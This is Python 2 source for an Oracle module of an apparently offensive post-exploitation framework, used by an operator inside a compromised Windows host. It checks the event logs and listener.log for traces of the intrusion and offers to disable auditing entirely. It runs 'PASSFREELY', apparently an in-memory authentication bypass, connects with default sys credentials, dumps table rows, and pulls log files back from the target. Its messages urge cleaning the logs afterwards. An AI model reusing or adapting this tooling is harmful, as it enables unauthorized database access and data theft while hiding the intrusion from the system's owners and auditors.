
import os
from collections import defaultdict
from datetime import timedelta
import dsz
import dsz.windows
import dsz.lp
import ops.menu
from ops.pprint import pprint
from ops.processes.processlist import get_processlist
import sql_utils
import sql_xml_parser
from generic import GenericDatabase
DRIVER = 'Driver'
USERNAME = 'Username'
PASSWORD = 'Password'
SID = 'SID'
HOST = 'Host'
PORT = 'Port'

class Oracle(GenericDatabase, ):
    NAME = 'Oracle'

    def __init__(self):
        GenericDatabase.__init__(self)
        self.passfreely_is_on = False

    def audit_check(self):
        print ''
        dsz.ui.Echo('Oracle can log in:\n        1) the Windows Application Event Logs\n        2) the listener.log file\n        3) its internal auditing mechanisms (including the Enterprise Manager console)', dsz.WARNING)
        print ''
        dsz.ui.Echo("We're going to check the first two, but we can't run the detailed auditing check (#3) until you connect to the database.", dsz.WARNING)
        dsz.ui.Echo('Once this is finished, connect and run the Detailed Audit Check Query Plan!', dsz.WARNING)
        print ''
        dsz.ui.Pause('Sound good?')
        event_log_check()
        enterprise_manager_check()
        self.audit_bypass_menu(disable_auditing=True)
        listener_log_check()
        print ''
        dsz.ui.Echo("Audit check complete, don't forget to run the Detailed Audit Check query plan after you connect!", dsz.WARNING)
        print ''
        return None

    def connection_string_wizard(self):
        print ''
        menu = ops.menu.Menu()
        heading = 'Change the options below to configure your connection string.\n\nDriver, Username and Password are required.\n\nEverything else is optional and should be changed if you have trouble connecting.'
        menu.set_heading(heading)
        menu.add_option(DRIVER, state=sql_utils.UNSET, callback=sql_utils.select_driver_menu, menu=menu)
        menu.add_str_option(USERNAME, sql_utils.UNSET, default='sys')
        menu.add_str_option(PASSWORD, sql_utils.UNSET, default='sys as sysdba')
        menu.add_str_option(SID, '')
        menu.add_ip_option(HOST, '')
        menu.add_int_option(PORT, 0, default=1521)
        while True:
            result = menu.execute(exit='Connect...')
            state = defaultdict((lambda : ''))
            state.update(result['all_states'][''])
            if (not any([value for value in state.values() if (value == sql_utils.UNSET)])):
                break
            else:
                print ''
                dsz.ui.Echo('You must set all required values!', dsz.ERROR)
        con_string = create_connection_string(state[DRIVER], state[USERNAME], state[PASSWORD], state[SID], state[HOST], state[PORT])
        return con_string

    def top_ten_query(self, handle_id):
        table_query_file = os.path.join(os.path.dirname(__file__), '..', '..', 'Data', 'database_plans', 'oracle', 'survey', 'tables.sql')
        top_ten_query = 'select * from %s where rownum <= 10'
        GenericDatabase.top_ten_query(self, handle_id, table_query_file, top_ten_query)

    def cleanup(self, handle_id):
        GenericDatabase.cleanup(self, handle_id)
        self.audit_bypass_menu(disable_auditing=False)
        event_log_check()
        listener_log_check()

    def audit_bypass_menu(self, disable_auditing=True):
        menu = ops.menu.Menu()
        if disable_auditing:
            print ''
            dsz.ui.Echo("If you'd like to disable auditing or enable PASSFREELY select one of the options below. Otherwise continue by pressing 0:", True)
            menu.add_option("Run 'audit -disable all'", callback=audit_disable_with_verify)
            menu.add_option('Run PASSFREELY (oracle -memcheck && oracle -open)', callback=self.check_and_run_passfreely, disable_auditing=True)
        else:
            print ''
            dsz.ui.Echo("If you'd like to reenable auditing or remove PASSFREELY select one of the options below. Otherwise continue by pressing 0:", True)
            menu.add_option('Re-enable auditing (prettych && stop <id>)', callback=reenable_auditing)
            menu.add_option('Run PASSFREELY (oracle -close && oracle -memcheck)', callback=self.check_and_run_passfreely, disable_auditing=False)
        menu.execute(exit='Continue On...', menuloop=False)
        if ((not disable_auditing) and self.passfreely_is_on):
            print ''
            dsz.ui.Echo("PASSFREELY is still running in memory! You'd better know what you're doing!", dsz.WARNING)
            print ''
            dsz.ui.Pause("If you hit 'Continue On' in error, go run oracle -close and oracle -memcheck in another terminal.", dsz.WARNING)

    def check_and_run_passfreely(self, disable_auditing):
        if disable_auditing:
            dsz.cmd.Prompt('oracle -memcheck')
            if dsz.cmd.Prompt('oracle -open'):
                self.passfreely_is_on = True
        else:
            dsz.cmd.Prompt('oracle -close')
            dsz.cmd.Prompt('oracle -memcheck')

def event_log_check():
    print ''
    dsz.ui.Echo('Checking Application Event Logs...', dsz.GOOD)
    print ''
    dsz.cmd.Run('eventlogquery -log Application')
    print ''
    if dsz.ui.Prompt('Would you like to view specific event logs?', True):
        rec_range = dsz.ui.GetString('Please provide space-separated start & end record numbers (e.g. 1 200)')
        print ''
        dsz.cmd.Run(('eventlogquery -log Application -record %s ' % rec_range))
        print ''
        dsz.ui.Pause('Review the event logs above...')
        print ''

def enterprise_manager_check():
    process_list = get_processlist(minimal=False, maxage=timedelta(seconds=(60 * 60)))
    emagent_process = [process for process in process_list if (process.name.lower() == 'emagent.exe')]
    if (not emagent_process):
        return
    emagent_process = emagent_process[0]
    print ''
    dsz.ui.Echo(('Oracle Enterprise Manager Agent is running! PID: %s' % emagent_process.id), dsz.WARNING)
    print ''
    dsz.ui.Echo("Any 'sys' logins will be logged even if using PASSFREELY! You'd better know what you're doing!", dsz.WARNING)
    print ''
    dsz.ui.Pause('')

def audit_disable_with_verify():
    print ''
    if (not dsz.ui.Prompt("Are you sure you'd like to run 'audit -disable all'? (Make sure you don't have security auditing dorked!)", dsz.RUN_FLAG_RECORD)):
        return
    (status, id) = dsz.cmd.RunEx('audit -disable all', dsz.RUN_FLAG_RECORD)
    if (not status):
        print ''
        dsz.ui.Echo('DISABLING AUDITING FAILED!!! GO GET HELP!', dsz.ERROR)

def reenable_auditing():
    print ''
    if (not dsz.cmd.Prompt('prettych', dsz.RUN_FLAG_RECORD)):
        return
    print ''
    if (not dsz.ui.Prompt('Would you like to stop a channel?', True)):
        return
    id_to_stop = dsz.ui.GetInt('Enter the channel ID')
    status = dsz.cmd.Prompt(('stop %s' % id_to_stop), True)
    if (not status):
        dsz.ui.Echo(("Couldn't stop channel %s" % id_to_stop), dsz.ERROR)

def listener_log_check():
    print ''
    dsz.ui.Echo('Checking for listener.log files...', dsz.GOOD)
    print ''
    dsz.control.echo.Off()
    if (not dsz.cmd.Prompt('dir -path * -mask listener.log -recursive -max 0', dsz.RUN_FLAG_RECORD)):
        dsz.control.echo.On()
        return
    dsz.control.echo.On()
    dir_items = dsz.cmd.data.Get('diritem', dsz.TYPE_OBJECT)
    items = []
    for item in dir_items:
        denied = dsz.cmd.data.ObjectGet(item, 'denied', dsz.TYPE_STRING)[0]
        if (denied == 'true'):
            continue
        path = dsz.cmd.data.ObjectGet(item, 'path', dsz.TYPE_STRING)[0]
        size = dsz.cmd.data.ObjectGet(item, 'fileitem::size', dsz.TYPE_INT)[0]
        modified_loc = 'fileitem::filetimes::modified::time'
        modified = dsz.cmd.data.ObjectGet(item, modified_loc, dsz.TYPE_STRING)[0]
        items.append({'path': (path + '\\listener.log'), 'size': size, 'modified': modified})
    if items:
        print ''
        pprint(items, ['Path', 'Size', 'Modified'], ['path', 'size', 'modified'])
        print ''
        dsz.ui.Echo(('I found %s listener.log file(s)' % len(items)), dsz.GOOD)
        for item in items:
            print ''
            if dsz.ui.Prompt(('Would you like to pull back the last 5 MB of %s?' % item['path'])):
                dsz.cmd.Run(('get "%s" -tail 5242880' % item['path']))
        print ''
        dsz.ui.Pause("Review the listener.log files you pulled. Make sure you understand how you'll log!")
    else:
        dsz.ui.Echo("I couldn't find any listener.log files... if you're not on the target database itself, you need to go there and clean it!", dsz.WARNING)

def create_connection_string(driver, uid, pwd, sid, host, port):
    con_string = ('driver={%s};uid={%s};pwd={%s}' % (driver, uid, pwd))
    if (sid and host and port):
        con_string += (';dbq=%s:%s/%s' % (host, port, sid))
    elif (sid and host and (not port)):
        con_string += (';dbq=%s/%s' % (host, sid))
    elif ((not sid) and host and port):
        con_string += (';dbq=%s:%s' % (host, port))
    elif (sid and (not host) and (not port)):
        con_string += (';dbq=%s' % sid)
    elif ((not sid) and host and (not port)):
        con_string += (';dbq=%s' % host)
    return con_string